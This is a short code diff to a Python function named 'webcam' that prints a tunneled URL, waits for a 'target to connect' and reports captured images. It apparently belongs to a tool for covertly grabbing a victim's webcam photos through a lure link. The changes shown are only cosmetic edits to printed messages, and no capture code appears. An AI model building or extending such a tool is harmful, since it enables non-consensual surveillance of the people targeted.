@@ -103,7 +103,7 @@ def webcam():
     print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
     linecache.clearcache()
 
-    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n" + Fore.RESET)
+    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
     try:
@@ -143,7 +143,7 @@ def webcam():
         folder = sum([f.stat().st_size for f in Path("../images").glob("**/*")])
     
         if folder != 0:
-           Sprint(Fore.GREEN + "\r\n\nI got the images , Check images folder".title() + Fore.RESET)
+           Sprint(Fore.GREEN + "\r\n\nI got the images Check images folder".title() + Fore.RESET)
            
            try:
             Sprint(Fore.YELLOW + "\r\npress ctrl + C for exit".title() + Fore.RESET)
